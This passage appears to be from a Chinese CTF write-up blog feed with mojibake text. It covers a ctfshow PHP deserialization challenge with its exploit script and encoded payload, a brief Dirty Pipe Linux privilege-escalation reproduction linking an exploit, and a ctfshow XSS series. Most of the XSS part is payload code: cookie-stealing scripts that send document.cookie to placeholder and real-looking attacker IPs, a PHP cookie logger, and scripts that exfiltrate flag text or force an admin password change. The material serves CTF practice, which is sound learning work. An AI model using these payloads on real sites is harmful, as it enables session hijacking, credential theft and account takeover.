class="number">9223372036854775806</span></span><br></pre></td></tr></table></figure><p>å¾—åˆ°flag</p><h2 id="easy-unserialize"><a href="#easy-unserialize" class="headerlink" title="easy unserialize"></a>easy unserialize</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Author</span>: F10wers_13eiCheng</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Date</span>:   2022-02-01 11:25:02</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Last</span> Modified by:   F10wers_13eiCheng</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Last</span> Modified time: 2022-02-07 15:08:18</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;./HappyYear.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">one</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$object</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">MeMeMe</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        array_walk(<span class="keyword">$this</span>, <span class="function"><span class="keyword">function</span>(<span class="params"><span class="variable">$fn</span>, <span class="variable">$prev</span></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$fn</span>[<span class="number">0</span>] === <span class="string">&quot;Happy_func&quot;</span> &amp;&amp; <span class="variable">$prev</span> === <span class="string">&quot;year_parm&quot;</span>) &#123;</span><br><span class="line">                <span class="keyword">global</span> <span class="variable">$talk</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$talk</span>&quot;</span>.<span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">                <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        @<span class="keyword">$this</span>-&gt;object-&gt;add();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;object-&gt;string;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">second</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$filename</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">addMe</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Wow you have sovled&quot;</span>.<span class="keyword">$this</span>-&gt;filename;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$args</span></span>) </span>&#123;</span><br><span class="line">        call_user_func([<span class="keyword">$this</span>, <span class="variable">$func</span>.<span class="string">&quot;Me&quot;</span>], <span class="variable">$args</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">third</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$string</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$string</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;string = <span class="variable">$string</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$var</span> = <span class="keyword">$this</span>-&gt;<span class="variable">$name</span>;</span><br><span class="line">        <span class="variable">$var</span>[<span class="variable">$name</span>]();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;ctfshow&quot;</span>])) &#123;</span><br><span class="line">    <span class="variable">$a</span>=unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;ctfshow&#x27;</span>]);</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;é«˜ä¸€æ–°ç”ŸæŠ¥é“&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹è¿™ä½å¸ˆå‚…å†™çš„åšå®¢ï¼Œæ¯”è¾ƒè¯¦ç»†<br><a href="https://blog.csdn.net/not_code_god/article/details/123170171?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522164604602616780271936202%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=164604602616780271936202&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-2-123170171.pc_search_result_control_group&utm_term=ctfshow%20%E5%8D%B7%E7%8E%8B%E6%9D%AF&spm=1018.2226.3001.4187">å¤§ä½¬åšå®¢</a><br>æœ€åçš„expä¸º</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">one</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$object</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$year_parm</span>=<span class="keyword">array</span>(<span class="number">0</span>=&gt;<span class="string">&quot;Happy_func&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">second</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">third</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$string</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;string=<span class="keyword">array</span>(<span class="string">&quot;string&quot;</span>=&gt;[<span class="keyword">new</span> one(),<span class="string">&quot;MeMeMe&quot;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> one();</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">new</span> one();</span><br><span class="line"><span class="variable">$c</span>=<span class="keyword">new</span> second();</span><br><span class="line"><span class="variable">$d</span>=<span class="keyword">new</span> third();</span><br><span class="line"><span class="variable">$b</span>-&gt;object=<span class="variable">$d</span>;</span><br><span class="line"><span class="variable">$c</span>-&gt;filename=<span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;object=<span class="variable">$c</span>;</span><br><span class="line"><span class="variable">$n</span>=<span class="literal">null</span>;</span><br><span class="line"><span class="variable">$payload</span>=<span class="keyword">array</span>(<span class="variable">$a</span>,<span class="variable">$n</span>);</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="variable">$payload</span>));</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>poc</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a%<span class="number">3</span>A2%<span class="number">3</span>A%<span class="number">7</span>Bi%<span class="number">3</span>A0%<span class="number">3</span>BO%<span class="number">3</span>A3%<span class="number">3</span>A%<span class="number">22</span>one%<span class="number">22</span>%<span class="number">3</span>A2%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A6%<span class="number">3</span>A%<span class="number">22</span><span class="keyword">object</span>%<span class="number">22</span>%<span class="number">3</span>BO%<span class="number">3</span>A6%<span class="number">3</span>A%<span class="number">22</span>second%<span class="number">22</span>%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A8%<span class="number">3</span>A%<span class="number">22</span>filename%<span class="number">22</span>%<span class="number">3</span>BO%<span class="number">3</span>A3%<span class="number">3</span>A%<span class="number">22</span>one%<span class="number">22</span>%<span class="number">3</span>A2%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A6%<span class="number">3</span>A%<span class="number">22</span><span class="keyword">object</span>%<span class="number">22</span>%<span class="number">3</span>BO%<span class="number">3</span>A5%<span class="number">3</span>A%<span class="number">22</span>third%<span class="number">22</span>%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A13%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>third%<span class="number">00</span><span class="keyword">string</span>%<span class="number">22</span>%<span class="number">3</span>Ba%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A6%<span class="number">3</span>A%<span class="number">22</span><span class="keyword">string</span>%<span class="number">22</span>%<span class="number">3</span>Ba%<span class="number">3</span>A2%<span class="number">3</span>A%<span class="number">7</span>Bi%<span class="number">3</span>A0%<span class="number">3</span>BO%<span class="number">3</span>A3%<span class="number">3</span>A%<span class="number">22</span>one%<span class="number">22</span>%<span class="number">3</span>A2%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A6%<span class="number">3</span>A%<span class="number">22</span><span class="keyword">object</span>%<span class="number">22</span>%<span class="number">3</span>BN%<span class="number">3</span>Bs%<span class="number">3</span>A9%<span class="number">3</span>A%<span class="number">22</span>year_parm%<span class="number">22</span>%<span class="number">3</span>Ba%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">7</span>Bi%<span class="number">3</span>A0%<span class="number">3</span>Bs%<span class="number">3</span>A10%<span class="number">3</span>A%<span class="number">22</span>Happy_func%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">7</span>D%<span class="number">7</span>Di%<span class="number">3</span>A1%<span class="number">3</span>Bs%<span class="number">3</span>A6%<span class="number">3</span>A%<span class="number">22</span>MeMeMe%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">7</span>D%<span class="number">7</span>D%<span class="number">7</span>Ds%<span class="number">3</span>A9%<span class="number">3</span>A%<span class="number">22</span>year_parm%<span class="number">22</span>%<span class="number">3</span>Ba%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">7</span>Bi%<span class="number">3</span>A0%<span class="number">3</span>Bs%<span class="number">3</span>A10%<span class="number">3</span>A%<span class="number">22</span>Happy_func%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">7</span>D%<span class="number">7</span>D%<span class="number">7</span>Ds%<span class="number">3</span>A9%<span class="number">3</span>A%<span class="number">22</span>year_parm%<span class="number">22</span>%<span class="number">3</span>Ba%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">7</span>Bi%<span class="number">3</span>A0%<span class="number">3</span>Bs%<span class="number">3</span>A10%<span class="number">3</span>A%<span class="number">22</span>Happy_func%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">7</span>D%<span class="number">7</span>Di%<span class="number">3</span>A0%<span class="number">3</span>BN%<span class="number">3</span>B%<span class="number">7</span>D</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>cve-2022-8047å¤ç°</title>
      <link href="/2022/03/09/cve-2022-8047%20linux%E6%8F%90%E6%9D%83/"/>
      <url>/2022/03/09/cve-2022-8047%20linux%E6%8F%90%E6%9D%83/</url>
      
        <content type="html"><![CDATA[<h2 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h2><p>CVE-2022-0847æ˜¯è‡ª 5.8 ä»¥æ¥ Linux å†…æ ¸ä¸­çš„ä¸€ä¸ªæ¼æ´ï¼Œæ”»å‡»è€…åˆ©ç”¨è¯¥æ¼æ´å¯ä»¥è¦†ç›–ä»»æ„åªè¯»æ–‡ä»¶ä¸­çš„æ•°æ®ã€‚è¿™æ ·å°†æ™®é€šçš„æƒé™æå‡è‡³rootæƒé™ï¼Œå› ä¸ºéç‰¹æƒè¿›ç¨‹å¯ä»¥å°†ä»£ç æ³¨å…¥åˆ°æ ¹è¿›ç¨‹</p><h2 id="å½±å“èŒƒå›´"><a href="#å½±å“èŒƒå›´" class="headerlink" title="å½±å“èŒƒå›´"></a>å½±å“èŒƒå›´</h2><p>Linux Kernelç‰ˆæœ¬ &gt;= 5.8<br>Linux Kernelç‰ˆæœ¬ &lt; 5.16.11 / 5.15.25 / 5.10.102</p><h2 id="å¤ç°"><a href="#å¤ç°" class="headerlink" title="å¤ç°"></a>å¤ç°</h2><p><a href="https://haxx.in/files/dirtypipez.c">exp</a><br>ä¹‹ååœ¨æ‰§è¡Œexp<br><img src="https://img-blog.csdnimg.cn/0d06c25f070349098794b771129bbacd.png"><br>ä¹‹åè¿è¡Œ<br><img src="https://img-blog.csdnimg.cn/1501433bef294e15b8f9e18f0771d1ed.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow xss</title>
      <link href="/2022/02/25/ctfshow%20xss/"/>
      <url>/2022/02/25/ctfshow%20xss/</url>
      
        <content type="html"><![CDATA[<p>é›†ä¸€ä¸‹å¯ç”¨çš„å§¿åŠ¿å§ï¼Œ</p><blockquote><p>window.open:open() æ–¹æ³•ç”¨äºæ‰“å¼€ä¸€ä¸ªæ–°çš„æµè§ˆå™¨çª—å£æˆ–æŸ¥æ‰¾ä¸€ä¸ªå·²å‘½åçš„çª—å£ã€‚<br>location.href=â€/urlâ€å½“å‰é¡µé¢æ‰“å¼€URLé¡µé¢<br>windows.location.href=â€/urlâ€ å½“å‰é¡µé¢æ‰“å¼€URLé¡µé¢<br>onfocusäº‹ä»¶åœ¨å¯¹è±¡è·å¾—ç„¦ç‚¹æ—¶å‘ç”Ÿ<br> autofocus å±æ€§è§„å®šå½“é¡µé¢åŠ è½½æ—¶ input å…ƒç´ åº”è¯¥è‡ªåŠ¨è·å¾—ç„¦ç‚¹ã€‚</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;window.open(<span class="string">&#x27;http://ip:ç«¯å£/&#x27;</span>+document.cookie)&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;window.location.href=<span class="string">&#x27;http://ip:ç«¯å£/&#x27;</span>+document.cookie&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;location.href=<span class="string">&#x27;http://ip:ç«¯å£/&#x27;</span>+document.cookie&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;input onfocus=<span class="string">&quot;window.open(&#x27;http://ip:ç«¯å£/&#x27;+document.cookie)&quot;</span> autofocus&gt;</span><br><span class="line"><span class="comment"># é€šè¿‡autofocuså±æ€§æ‰§è¡Œæœ¬èº«çš„focusäº‹ä»¶ï¼Œè¿™ä¸ªå‘é‡æ˜¯ä½¿ç„¦ç‚¹è‡ªåŠ¨è·³åˆ°è¾“å…¥å…ƒç´ ä¸Š,è§¦å‘ç„¦ç‚¹äº‹ä»¶ï¼Œæ— éœ€ç”¨æˆ·å»è§¦å‘</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>onload äº‹ä»¶ä¼šåœ¨é¡µé¢æˆ–å›¾åƒåŠ è½½å®Œæˆåç«‹å³å‘ç”Ÿã€‚</p><p>svgæ ‡ç­¾</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg onload=<span class="string">&quot;window.open(&#x27;http://ip:ç«¯å£/&#x27;+document.cookie)&quot;</span>&gt;</span><br></pre></td></tr></table></figure><p>iframeæ ‡ç­¾</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe onload=<span class="string">&quot;window.open(&#x27;http://ip:ç«¯å£/&#x27;+document.cookie)&quot;</span>&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure><p>bodyæ ‡ç­¾</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;body onload=<span class="string">&quot;window.open(&#x27;http://ip:ç«¯å£/&#x27;+document.cookie)&quot;</span>&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>imgï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="keyword">var</span> img=document.createElement(<span class="string">&quot;img&quot;</span>); img.src=<span class="string">&quot;http://118.31.168.198:39543/&quot;</span>+document.cookie;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="web316"><a href="#web316" class="headerlink" title="web316"></a>web316</h2><p>åˆ©ç”¨è‡ªå·±çš„æœåŠ¡å™¨åœ¨æœåŠ¡å™¨é¡µé¢ä¸Šå†™å…¥</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># a.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$cookie</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cookie&#x27;</span>];</span><br><span class="line"><span class="variable">$log</span> = fopen(<span class="string">&quot;cookie.txt&quot;</span>, <span class="string">&quot;a&quot;</span>);</span><br><span class="line">fwrite(<span class="variable">$log</span>, <span class="variable">$cookie</span> . <span class="string">&quot;\n&quot;</span>);</span><br><span class="line">fclose(<span class="variable">$log</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ä¹‹ååœ¨é¢˜ç›®é¡µé¢å†™å…¥js</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// jsä»£ç </span></span><br><span class="line">&lt;script&gt;document.location.href=<span class="string">&#x27;http://xxx/a.php?cookie=&#x27;</span>+document.cookie&lt;/script&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ä¹‹ååœ¨æœåŠ¡å™¨å†…å¾—åˆ°flag</p><h2 id="web317"><a href="#web317" class="headerlink" title="web317"></a>web317</h2><p>scriptæ ‡ç­¾è¢«è¿‡æ»¤ï¼Œå¯ä»¥ç”¨body</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;body onload=<span class="string">&quot;window.location.href=&#x27;http://124.222.115.141/a.php?cookie=&#x27;+document.cookie&quot;</span>&gt;&lt;/body&gt;</span><br></pre></td></tr></table></figure><h2 id="web-318"><a href="#web-318" class="headerlink" title="web 318"></a>web 318</h2><p>è¿‡æ»¤äº†img,ç”¨317å¾—payload</p><h2 id="web319"><a href="#web319" class="headerlink" title="web319"></a>web319</h2><p>åŒä¸Š</p><h2 id="web320"><a href="#web320" class="headerlink" title="web320"></a>web320</h2><p>æœ¬é¢˜ç©ºæ ¼è¢«è¿‡æ»¤<br>åˆ©ç”¨%09å¾—urlè§£ç è¿›è¡Œè§£é¢˜</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;bodyonload=<span class="string">&quot;window.location.href=&#x27;http://124.222.115.141/a.php?cookie=&#x27;+document.cookie&quot;</span>&gt;&lt;/body&gt;</span><br></pre></td></tr></table></figure><h2 id="web321"><a href="#web321" class="headerlink" title="web321"></a>web321</h2><p>åŒä¸Š</p><h2 id="web322"><a href="#web322" class="headerlink" title="web322"></a>web322</h2><p>åˆæŠŠiframeç»™è¿‡æ»¤äº†<br>pocåŒä¸Š</p><h2 id="web323"><a href="#web323" class="headerlink" title="web323"></a>web323</h2><p>åŒä¸Š</p><h2 id="web324-326"><a href="#web324-326" class="headerlink" title="web324~326"></a>web324~326</h2><p>åŒä¸Š</p><h2 id="web327"><a href="#web327" class="headerlink" title="web327"></a>web327</h2><p>å­˜å‚¨å‹XSSã€‚é¦–å…ˆå°±æ˜¯posterå¿…é¡»æ˜¯adminæ‰èƒ½å‘é€æˆåŠŸï¼Œå…¶æ¬¡å°±æ˜¯XSSçš„è§¦å‘ç‚¹åº”è¯¥æ˜¯senderå’Œcontentéƒ½å¯ä»¥ã€‚ç›´æ¥ç”¨ä¸€ä¸‹xsså¹³å°çš„payloadå°±å¯ä»¥äº†ã€‚ï¼ˆä¸è¦ç”¨imgï¼Œimgä¼¼ä¹è¢«è¿‡æ»¤ï¼‰<br><img src="https://img-blog.csdnimg.cn/5048b8ef24b94db991a3b4773d66cf4c.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="web328"><a href="#web328" class="headerlink" title="web328"></a>web328</h2><p>çœ‹åˆ°åå…ˆæ³¨å†Œï¼Œä¹‹åå‘ç°å¿…é¡»æ˜¯ç®¡ç†å‘˜æ‰èƒ½æŸ¥çœ‹<br>äºæ˜¯æ³¨å†Œæ—¶åˆ©ç”¨ä¸‹é¢çš„ä½œä¸ºå¯†ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;window.location.href=<span class="string">&#x27;http://124.222.115.141/a.php?cookie=&#x27;</span>+document.cookie;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>ä¹‹ååœ¨æœåŠ¡å™¨ä¸Šçœ‹åˆ°ç®¡ç†å‘˜cookie<br>åˆ©ç”¨cookieè¿›å…¥ç®¡ç†å‘˜é¡µé¢<br>ä¹‹åå‘ç°ä¼šå‡ºç°è·³é—ªï¼Œåˆ©ç”¨bpæŠ“åŒ…ä¸€æ­¥ä¸€æ­¥çš„æ”¾åŒ…å³å¯å¾—åˆ°flag</p><h2 id="web329"><a href="#web329" class="headerlink" title="web329"></a>web329</h2><p>æ–¹æ³•åŒä¸Šï¼Œèƒ½å¾—åˆ°cookieä½†æ˜¯è¿˜æ˜¯è®¿é—®ä¸äº†é¡µé¢</p><p>åŸå› æ˜¯ï¼Œç®¡ç†å‘˜è®¿é—®äº†é¡µé¢å°±é€€å‡ºäº†ï¼Œç›¸å½“äºç°åœ¨å¾—åˆ°çš„æœ€æ–°cookieæ˜¯ç®¡ç†å‘˜ä¸Šä¸€æ¬¡ç”¨çš„cookie</p><p>è¿™é‡Œä¸è¡Œäº†å‘€è¿™é‡Œï¼Œçœ‹äº†ä¸‹wpæ˜¯ç”¨js</p><p>è¿™æ ·ï¼Œçœ‹è§†é¢‘<a href="https://www.bilibili.com/video/BV1gi4y1A76p">bili</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;$(<span class="string">&#x27;.laytable-cell-1-0-1&#x27;</span>).each(<span class="function"><span class="keyword">function</span>(<span class="params">index,value</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(value.innerHTML.indexOf(<span class="string">&#x27;ctf&#x27;</span>+<span class="string">&#x27;show&#123;&#x27;</span>)&gt;-<span class="number">1</span>)&#123;</span><br><span class="line">        window.location.href=<span class="string">&#x27;http://124.222.115.141/a.php?cookie=&#x27;</span>+value.innerHTML; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;);&lt;/script&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ï¼ˆctfshowä¸­é—´æœ‰+å·ï¼Œæ˜¯å› ä¸ºé˜²æ­¢æŠŠè‡ªå·±å†™çš„jsç»™å‘é€è¿‡å»ï¼‰<br>è¿™æ ·å¯ä»¥å¾—åˆ°ç®¡ç†å‘˜å¯†ç <br>æˆ–è€…åœ¨showååŠ {å¯å¾—åˆ°flag</p><h2 id="web330"><a href="#web330" class="headerlink" title="web330"></a>web330</h2><p>æœ¬é¢˜åˆ©ç”¨ä¸Šä¸€é¢˜çš„åšæ³•æ— æ³•å®ç°<br>ç»è¿‡è§‚å¯Ÿï¼Œå‘ç°å­˜åœ¨ä¿®æ”¹å¯†ç ï¼Œç»æµ‹è¯•ï¼Œå¯ä»¥å‘ç°å¯ä»¥ä¿®æ”¹adminçš„å¯†ç <br>åˆ©ç”¨</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;window.location.href=<span class="string">&#x27;http://127.0.0.1/api/change.php?p=123&#x27;</span>;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>ï¼ˆæ³¨æ„è¦å°†è¯¥jsæ”¾åœ¨ç”¨æˆ·åä¸­è¿›è¡Œåˆ©ç”¨ï¼‰<br>ä¹‹åç™»å½•adminå¾—åˆ°flag</p><h2 id="web331"><a href="#web331" class="headerlink" title="web331"></a>web331</h2><p>æœ¬é¢˜å’Œä¸Šä¸€é¢˜ç›¸ä¼¼<br>ä½†æœ¬é¢˜æ˜¯POSTä¼ å‚<br>çœ‹æºç å¾—åˆ°<br><img src="https://img-blog.csdnimg.cn/9b42d1a9da8d4df396c34684765e34c2.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>äºæ˜¯åˆ¶ä½œjsä¿®æ”¹ç®¡ç†å‘˜å¯†ç </p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;$.ajax(&#123;<span class="attr">url</span>:<span class="string">&#x27;api/change.php&#x27;</span>,<span class="attr">type</span>:<span class="string">&#x27;post&#x27;</span>,<span class="attr">data</span>:&#123;<span class="attr">p</span>:<span 